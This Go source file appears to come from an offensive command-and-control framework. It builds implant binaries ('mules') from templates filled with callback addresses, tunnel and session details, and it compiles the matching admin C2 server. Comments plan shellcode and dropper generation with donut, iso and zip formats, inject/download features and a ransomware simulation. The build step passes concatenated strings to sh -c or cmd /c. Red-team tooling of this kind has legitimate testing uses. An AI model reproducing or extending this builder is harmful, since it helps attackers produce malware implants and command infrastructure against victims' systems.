package builder

import (
  "os"
  "fmt"
  //"time"
  //"errors"
  "bytes"
  "os/exec"
  "text/template"

  "odin/lib/c2"
  "odin/lib/utils"
  //"odin/wheagle/server/lib"
)
type Generator interface {
  Generate() error
}

type MinionGenerate struct {
  Ma *c2.MinionAgent
  Bob *Builder
}

type MSGenerate struct {
  Ac2 *c2.AdminC2
  Bob *Builder
}

func (m *MinionGenerate) Generate() error{
  muleData := struct {
    ID string
    MotherShipID string
    Expiry string
    Active bool
    SessionID string
    Address string
    TunnelAddress string
    EntryPoint string
  }{
    ID: m.Ma.MuleId,
    MotherShipID: m.Ma.MSId,
    Expiry: m.Ma.MSession.Expiry,
    Active: true,
    SessionID: m.Ma.MSession.SessionID,
    Address: m.Ma.Address + ":"+utils.IntToString(m.Ma.Port),
    TunnelAddress: m.Ma.MotherShip,
    EntryPoint: m.Bob.EntryPoint,
  }
  tmpl := template.Must(template.New("source").Parse(m.Bob.Template))
  tempFile,err := CreateTempFile(m.Bob.Dir,tmpl,muleData)
  if err != nil{
    return fmt.Errorf("Error creating temporary file: %v",err)
  }
  defer os.Remove(tempFile.Name())
  if err = m.Bob.BuildGoBinary(tempFile.Name()); err != nil{
    return err
  }
  // use a new generate command for this
  // generate shellcode/dropper iF payload.exe oF encoded_payload.exe -f donut,iso,zip inject/download
  // add a ransom sim command
  // now check for encoding and encode
  // check format for sc, if true
  utils.PrintTextInASpecificColorInBold("white",fmt.Sprintf("Created mule: %s.",m.Ma.Name))
  return nil
}

func (msg *MSGenerate) Generate() error{
  ac2 := struct {
    Name  string
    Password string
    MSId  string
    Address string
    OProtocol string
    ImplantProtocol string
    ImplantTunnel string
    AdminTunnel string
    EntryPoint string
    OPort  int
    ImplantPort  int
    }{
      Name:  msg.Ac2.Name,
      Password: msg.Ac2.Password,
      MSId: msg.Ac2.MSId,
      Address: msg.Ac2.Address,
      OProtocol: msg.Ac2.OProtocol,
      ImplantProtocol: msg.Ac2.ImplantProtocol,
      ImplantTunnel: msg.Ac2.ImplantTunnel,
      AdminTunnel: msg.Ac2.AdminTunnel,
      OPort: msg.Ac2.OPort,
      ImplantPort: msg.Ac2.ImplantPort,
      EntryPoint: msg.Bob.EntryPoint,
    }
  tpl := template.Must(template.New("source").Parse(msg.Bob.Template))
  tempFile,err := CreateTempFile(msg.Bob.Dir,tpl,ac2)
  if err != nil{
    fmt.Sprintf("Is this the error: %s",err)
    return fmt.Errorf("Error creating temporary file: %v",err)
  }
  defer os.Remove(tempFile.Name())
  if err = msg.Bob.BuildGoBinary(tempFile.Name()); err != nil{
    return err
  }
  utils.PrintTextInASpecificColorInBold("white",fmt.Sprintf("Created AdminC2: %s.",msg.Ac2.Name))
  return nil
}

func (b *Builder) BuildGoBinary(loc string) error{
  //bin,err := exec.Command(b.BuildCommand).CombinedOutput()
  var cmd *exec.Cmd
  currOs := utils.GetCurrentOS()
  if currOs  == "windows"{
    cmd = exec.Command("cmd","/c",b.BuildCommand + " " + loc)
  } else {
    cmd = exec.Command("sh","-c",b.BuildCommand + " " + loc)
  }
  cmd.Stdout = os.Stdout
  cmd.Stderr = os.Stderr
  return cmd.Run()
/*  if err != nil {
    utils.CustomError("Build error: ",err)
    return err
  }
  if bytes.Contains(bin, []byte("error")) {
    return fmt.Errorf("Error building mule: %v",err)
  }
  return nil*/
}

func CreateTempFile(dir string,tmpl *template.Template, message interface{}) (*os.File, error) {
  file, err := os.Create(dir + utils.RandString(6) + ".go")
  if err != nil {
    return nil, err
  }
  defer func() {
    file.Close()
    //os.Remove(file.Name())
  }()
  var buf bytes.Buffer
  err = tmpl.Execute(&buf, message)
  if err != nil {
    return nil, err
  }
  _, err = file.Write(buf.Bytes())
  if err != nil {
    return nil, err
  }
  return file, nil
}

/*func (msg *MSGenerate) Generate() error{
    tmplChan := make(chan *template.Template)
    errChan := make(chan error)
    go func() {
        tmpl,err := template.New("source").Parse(msg.Bob.Template)
        if err != nil{
            errChan <- err
            return
        }
        tmplChan <- tmpl
    }()
    select {
    case tmpl := <- tmplChan:
        tempFile,err := CreateTempFile(tmpl,msg.Ac2)
        if err != nil{
            return fmt.Errorf("Error creating temporary file: %v",err)
        }
        defer os.Remove(tempFile.Name())
        if err = msg.Bob.BuildGoBinary(); err != nil{
            return err
        }
        utils.PrintTextInASpecificColorInBold("white",fmt.Sprintf("Created AdminC2: %s.",msg.Ac2.Name))
        return nil
    case err := <- errChan:
        return err
    case <- time.After(time.Second * 5):
        return fmt.Errorf("Template parsing timed out")
    }
}
*/
